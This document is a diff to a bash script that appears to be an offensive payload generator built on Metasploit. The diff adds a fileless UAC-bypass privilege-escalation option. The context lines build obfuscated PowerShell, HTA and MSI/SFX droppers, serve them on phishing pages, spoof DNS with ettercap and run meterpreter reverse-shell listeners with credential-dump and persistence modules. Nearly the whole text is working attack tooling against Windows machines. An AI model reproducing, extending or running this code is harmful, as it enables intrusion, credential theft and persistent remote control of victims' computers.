@@ -1525,9 +1569,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -1535,9 +1579,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
 
         fi
@@ -1545,7 +1589,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/exec[bak].rb $InJEc4 > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -1571,7 +1615,7 @@ cd $IPATH/
 # -------------------------------------------
 sh_shellcode8 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: shellcode" --entry --width 330) > /dev/null 2>&1
@@ -1579,7 +1623,7 @@ N4m=$(zenity --title="☠ MSI NAME ☠" --text "example: shellcode" --entry --wi
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> msi format ..."
+echo "[☠] Building shellcode -> msi format ..."
 # display final settings to user
 cat << !
 
@@ -1598,12 +1642,12 @@ xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$
 
 
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
-echo "[☠ ] Injecting shellcode -> $N4m.msi!"
+echo "[☠] Injecting shellcode -> $N4m.msi!"
 sleep 2
 # build winrar/SFX trigger.bat script
-echo "[☠ ] Building winrar/SFX -> trigger.bat..."
+echo "[☠] Building winrar/SFX -> trigger.bat..."
 sleep 2
 echo ":: SFX auxiliary | Author: r00t-3xp10it" > $IPATH/output/trigger.bat
 echo ":: this script will run payload using msiexec" >> $IPATH/output/trigger.bat
@@ -1621,9 +1665,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -1632,7 +1676,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 
       N4m2=$(zenity --title="☠ SFX Infection ☠" --text "WARNING BEFOR CLOSING THIS BOX:\n\nTo use SFX attack vector: $N4m.msi needs to be\ncompressed together with trigger.bat into one SFX\n\n1º compress the two files into one SFX\n2º store SFX into shell/output folder\n3º write the name of the SFX file\n4º press OK to continue...\n\nExample:output.exe" --entry --width 360) > /dev/null 2>&1
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start trigger.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -1645,7 +1689,6 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     sed -i "s|IPATH|$IPATH|g" persistence2.rc
     sed "s|M1P|$M1P|g" persistence2.rc > persistence.rc
 
-
     # Build listenner resource file
     echo "use exploit/multi/handler" > $lhost.rc
     echo "set LHOST $lhost" >> $lhost.rc
@@ -1654,6 +1697,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     echo "exploit" >> $lhost.rc
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
+
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m2|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m2|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
 
   else
 
@@ -1668,7 +1727,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m2 $ApAcHe/$N4m2 > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -1680,9 +1739,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -1691,9 +1750,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -1701,8 +1760,10 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 mv $IPATH/aux/persistence2[bak].rc $IPATH/aux/persistence2.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
@@ -1727,17 +1788,16 @@ clear
 # --------------------------------------------------------------
 sh_shellcode9 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 zenity --title="☠ WARNING: ☠" --text "'Invoke-Shellcode' technic only works\nagaints 32 byte systems (windows)" --info > /dev/null 2>&1
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 # input payload choise
-paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 200) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 200) > /dev/null 2>&1
 
-
-echo "[☠ ] Building shellcode -> powershell format ..."
+echo "[☠] Building shellcode -> powershell format ..."
 sleep 2
 # display final settings to user
 cat << !
@@ -1764,14 +1824,14 @@ mv *.bat $IPATH/bin/sedding.raw
 disp=`cat $IPATH/bin/sedding.raw | grep "Shellcode" | awk {'print $8'}`
 echo "$disp" > $IPATH/output/chars.raw
 echo ""
-echo "[☠ ] shellcode -> powershell encoded!"
+echo "[☠] shellcode -> powershell encoded!"
 sleep 2
 echo $disp
 echo "" && echo ""
 sleep 2
 
 # EDITING/BACKUP FILES NEEDED
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc8 $IPATH/templates/InvokePS1[bak].bat
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 sleep 2
@@ -1779,29 +1839,29 @@ sleep 2
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
    # check if template exists
    if [ -e $InJEc8 ]; then
-      echo "[☠ ] InvokePS1.bat -> found!"
+      echo "[☠] InvokePS1.bat -> found!"
       sleep 2
    else
-      echo "[☠ ] InvokePS1.bat -> not found!"
+      echo "[☠] InvokePS1.bat -> not found!"
       exit
    fi
 
 
 # injecting shellcode into name
 cd $IPATH/templates/
-echo "[☠ ] Injecting shellcode -> $N4m.bat!"
+echo "[☠] Injecting shellcode -> $N4m.bat!"
 sleep 2
 sed "s|InJ3C|$disp|g" InvokePS1.bat > $N4m.bat
 mv $N4m.bat $IPATH/output/$N4m.bat
@@ -1814,9 +1874,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -1824,7 +1884,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -1845,6 +1905,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
 
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m.bat|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m.bat|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
+
   else
 
     echo "do nothing" > /dev/null 2>&1
@@ -1859,7 +1935,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.bat $ApAcHe/$N4m.bat > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -1871,9 +1947,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -1882,9 +1958,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -1893,9 +1969,11 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/InvokePS1[bak].bat $InJEc8 > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/phishing/copy.html > /dev/null 2>&1
 rm -r $H0m3/.psploit > /dev/null 2>&1
@@ -1920,14 +1998,14 @@ cd $IPATH/
 # -----------------------------------------------------
 sh_shellcode10 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> HTA-PSH format ..."
+echo "[☠] Building shellcode -> HTA-PSH format ..."
 # display final settings to user
 cat << !
 
@@ -1945,7 +2023,7 @@ xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$
 
 echo ""
 # display generated shelcode
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 store=`cat $IPATH/output/chars.raw | awk {'print $7'}`
 echo $store
@@ -1960,42 +2038,42 @@ sleep 2
    # check if all dependencies needed are installed
    # check if template exists
    if [ -e $InJEc6 ]; then
-      echo "[☠ ] exec.hta -> found!"
+      echo "[☠] exec.hta -> found!"
       sleep 2
    else
-      echo "[☠ ] exec.hta -> not found!"
+      echo "[☠] exec.hta -> not found!"
       exit
    fi
 
    if [ -e $InJEc7 ]; then
-      echo "[☠ ] index.html -> found!"
+      echo "[☠] index.html -> found!"
       sleep 2
    else
-      echo "[☠ ] index.html -> not found!"
+      echo "[☠] index.html -> not found!"
       exit
    fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
 # EDITING/BACKUP FILES NEEDED
 N4m=$(zenity --entry --title "☠ PAYLOAD NAME ☠" --text "Enter payload output name\nexample: Launcher" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc6 $IPATH/templates/hta_attack/mine[bak].hta
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 
 cd $IPATH/templates/hta_attack
 # use SED to replace NaM3 and Inj3C
-echo "[☠ ] Injecting shellcode -> $N4m.hta!"
+echo "[☠] Injecting shellcode -> $N4m.hta!"
 # replace NaM3 by $N4m (var grab by venom.sh)
 sed "s|NaM3|$N4m.hta|g" index.html > copy.html
 mv copy.html $IPATH/output/index.html
@@ -2012,9 +2090,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
       zenity --title="☠ SHELLCODE GENERATOR ☠" --text "Store the 2 files in apache2 webroot and\nSend: [ http://$lhost/index.html ]\nto target machine to execute payload" --info > /dev/null 2>&1
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -2022,11 +2100,11 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" --width 350 --height 240) > /dev/null 2>&1
+      P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "post_multi.rc" --width 350 --height 270) > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.hta $ApAcHe/$N4m.hta > /dev/null 2>&1
       cp index.html $ApAcHe/index.html > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -2038,9 +2116,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -2049,9 +2127,9 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -2060,7 +2138,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/hta_attack/mine[bak].hta $InJEc6 > /dev/null 2>&1
 mv $IPATH/templates/hta_attack/index[bak].html $InJEc7 > /dev/null 2>&1
 rm $IPATH/templates/hta_attack/chars.raw > /dev/null 2>&1
@@ -2085,7 +2163,7 @@ cd $IPATH/
 # --------------------------------------------------------------
 sh_shellcode11 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
@@ -2093,7 +2171,7 @@ N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode ou
 # input payload choise
 paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 305) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> psh-cmd format ..."
+echo "[☠] Building shellcode -> psh-cmd format ..."
 # display final settings to user
 cat << !
 
@@ -2114,24 +2192,24 @@ echo "$str0" > $IPATH/output/chars.raw
 
 # display shellcode
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 3
 echo $str0
 echo "" && echo ""
 
 # EDITING/BACKUP FILES NEEDED
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 sleep 2
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
@@ -2139,7 +2217,7 @@ sleep 2
 
 cd $IPATH/output/
 # compiling to ps1 output format
-echo "[☠ ] Injecting shellcode -> $N4m.ps1!"
+echo "[☠] Injecting shellcode -> $N4m.ps1!"
 sleep 2
 echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc Sh33L" > payload.raw
 sed "s|Sh33L|$str0|" payload.raw > $N4m.ps1
@@ -2147,7 +2225,7 @@ rm $IPATH/output/payload.raw > /dev/null 2>&1
 
